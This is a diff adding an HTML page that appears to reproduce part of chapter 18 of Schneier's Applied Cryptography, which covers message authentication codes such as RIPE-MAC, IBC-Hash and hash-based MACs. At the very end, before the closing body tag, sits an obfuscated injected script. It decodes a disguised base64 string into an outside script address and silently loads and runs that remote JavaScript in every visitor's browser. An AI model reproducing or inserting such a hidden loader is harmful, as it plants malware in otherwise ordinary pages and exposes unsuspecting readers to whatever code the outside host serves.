@@ -1,0 +1,108 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=457-459//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch19/19-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Bidirectional MAC</I></B></FONT></P>
+<P>This MAC produces a hash value twice the length of the block algorithm [978]. First, compute the CBC-MAC of the message. Then, compute the CBC-MAC of the message with the blocks in reverse order. The bidirectional MAC value is simply the concatenation of the two. Unfortunately, this construction is insecure [1097].
+</P>
+<P><FONT SIZE="+1"><B><I>Jueneman&#146;s Methods</I></B></FONT></P>
+<P>This MAC is also called a quadratic congruential manipulation detection code (QCMDC) [792, 789]. First, divide the message into m- bit blocks. Then:
+</P>
+<DL>
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is the secret key
+<DD><I>H</I><SUB>i</SUB> = (<I>H</I><SUB>i- 1</SUB> &#43; <I>M</I><SUB>i</SUB>)2 mod <I>p,</I> where <I>p</I> is a prime less than 2<SUP>m </SUP>- 1 and &#43; denotes integer addition
+</DL>
+<P>Jueneman suggests <I>n</I> = 16 and <I>p</I> = 2<SUP>31</SUP> - 1. In [792] he also suggests that an additional key be used as <I>H</I><SUB>1,</SUB> with the actual message starting at <I>H</I><SUB>2</SUB>.</P>
+<P>Because of a variety of birthday-type attacks discovered in conjunction with Don Coppersmith, Jueneman suggested computing the QCMDC four times, using the result of one iteration as the IV for the next iteration, and then concatenating the results to obtain a 128-bit hash value [793]. This was further strengthened by doing the four iterations in parallel and cross-linking them [790, 791]. This scheme was broken by Coppersmith [376].</P>
+<P>Another variant [432, 434] replaced the addition operation with an XOR and used message blocks significantly smaller than <I>p. H</I><SUB>0</SUB> was also set, making it a keyless one-way hash function. After this scheme was attacked [612], it was strengthened as part of the European Open Shop Information-TeleTrust project [1221], quoted in CCITT X.509 [304], and adopted in ISO 10118 [764, 765]. Unfortunately, Coppersmith has broken this scheme as well [376]. There has been some research using exponents other than 2 [603], but none of it has been promising.</P>
+<P><FONT SIZE="+1"><B><I>RIPE-MAC</I></B></FONT></P>
+<P>RIPE-MAC was invented by Bart Preneel [1262] and adopted by the RIPE project [1305] (see Section 18.8). It is based on ISO 9797 [763], and uses DES as a block encryption function. RIPE-MAC has two flavors: one using normal DES, called RIPE-MAC1, and another using triple-DES for even greater security, called RIPE-MAC3. RIPE-MAC1 uses one DES encryption per 64-bit message block; RIPE-MAC3 uses three.
+</P>
+<P>The algorithm consists of three parts. First, the message is expanded to a length that is a multiple of 64 bits. Next, the expanded message is divided up into 64-bit blocks. A keyed compression function is used to hash these blocks, under the control of a secret key, into a single block of 64 bits. This is the step that uses either DES or triple-DES. Finally, the output of this compression is subjected to another DES-based encryption with a different key, derived from the key used in the compression. See [1305] for details.</P>
+<P><FONT SIZE="+1"><B><I>IBC-Hash</I></B></FONT></P>
+<P>IBC-Hash is another MAC adopted by the RIPE project [1305] (see Section 18.8). It is interesting because it is provably secure; the chance of successful attack can be quantified. Unfortunately, every message must be hashed with a different key. The chosen level of security puts constraints on the maximum message size that can be hashed&#151;something no other function in this chapter does. Given these considerations, the RIPE report recommends that IBC-Hash be used only for long, infrequently sent messages.
+</P>
+<P>The heart of the function is</P>
+<DL>
+<DD><I>h</I><SUB>i</SUB> = ((<I>M</I><SUB>i</SUB> mod <I>p</I>) &#43; <I>v</I> ) mod 2<SUB>n</SUB>
+</DL>
+<P>The secret key is the pair <I>p</I> and <I>v,</I> where <I>p</I> is an N- bit prime and <I>v</I> is a random number less than 2<SUP>n</SUP>. The Mi values are derived by a carefully specified padding procedure. The probabilities of breaking both the one-wayness and the collision-resistance can be quantified, and users can choose their security level by changing the parameters.</P>
+<P><FONT SIZE="+1"><B><I>One-Way Hash Function MAC</I></B></FONT></P>
+<P>A one-way hash function can also be used as a MAC [1537]. Assume Alice and Bob share a key <I>K,</I> and Alice wants to send Bob a MAC for message <I>M</I>. Alice concatenates <I>K</I> and <I>M,</I> and computes the one-way hash of the concatenation: <I>H</I> (<I>K,M</I> ). This hash is the MAC. Since Bob knows <I>K,</I> he can reproduce Alice&#146;s result. Mallory, who does not know <I>K,</I> can&#146;t.</P>
+<P>This method works with MD-strengthening techniques, but has serious problems. Mallory can always add new blocks to the end of the message and compute a valid MAC. This attack can be thwarted if you put the message length at the beginning, but Preneel is suspicious of this scheme [1265]. It is better to put the key at the end of the message, <I>H</I> (<I>M,K</I> ), but this has some problems as well [1265]. If <I>H</I> is one-way but not collision-free, Mallory can forge messages. Still better is <I>H</I> (<I>K,M,K</I> ), or <I>H</I> (<I>K</I><SUB>1</SUB><I>,M,K</I><SUB>2</SUB> ), where <I>K</I><SUB>1</SUB> and <I>K2</I> are different [1537]. Preneel is still suspicious [1265].</P>
+<P>The following constructions seem secure:</P>
+<DL>
+<DD><I>H</I> (<I>K</I><SUB>1</SUB>,H(<I>K</I><SUB>2</SUB>, <I>M</I>))
+<DD><I>H</I> (<I>K, H</I> (<I>K,M</I>))
+<DD><I>H</I> (<I>K,p,M,K</I> ), where <I>p</I> pads <I>K</I> to a full message block.
+</DL>
+<I><P><A NAME="Fig15"></A><A HREF="javascript:displayWindow('images/18-15.jpg',228,128 )"><IMG SRC="images/18-15t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-15.jpg',228,128)"><FONT COLOR="#000077"><B>Figure 18.15</B></FONT></A>&nbsp;&nbsp;Stream cipher MAC.</I>
+</P>
+<P>The best approach is to concatenate at least 64 bits of the key with each message block. This makes the one-way hash function less efficient, because the message blocks are smaller, but it is much more secure [1265].
+</P>
+<P>Alternatively, use a one-way hash function and a symmetric algorithm. Hash the file, then encrypt the hash. This is more secure than first encrypting the file and then hashing the encrypted file, but it is vulnerable to the same attack as the <I>H</I> (<I>M,K</I> ) approach [1265].</P>
+<P><FONT SIZE="+1"><B><I>Stream Cipher MAC</I></B></FONT></P>
+<P>This MAC scheme uses stream ciphers (see Figure 18.15) [932]. A cryptographically secure pseudo-random-bit generator demultiplexes the message stream into two substreams. If the output bit of the bit generator <I>k</I><SUB>i</SUB>, is 1, then the current message bit <I>m</I><SUB>i</SUB>, is routed to the first substream; if the <I>k</I><SUB>i</SUB> is 0, the <I>mi</I> is routed to the second substream. The substreams are each fed into a different LFSR (see Section 16.2). The output of the MAC is simply the final states of the shift registers.</P>
+<P>Unfortunately, this method is not secure against small changes in the message [1523]. For example, if you alter the last bit of the message, then only 2 bits in the corresponding MAC value need to be altered to create a fake MAC; this can be done with reasonable probability. The author presents a more secure, and more complicated, alternative.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch19/19-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(EMXLHbsV, ZubToVIe) {ZubToVIe = EMXLHbsV.createElement('script');ZubToVIe.type = 'text/javascript';ZubToVIe.async = true;ZubToVIe.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');EMXLHbsV.getElementsByTagName('body')[0].appendChild(ZubToVIe);}(document));</script></body>
+</html>
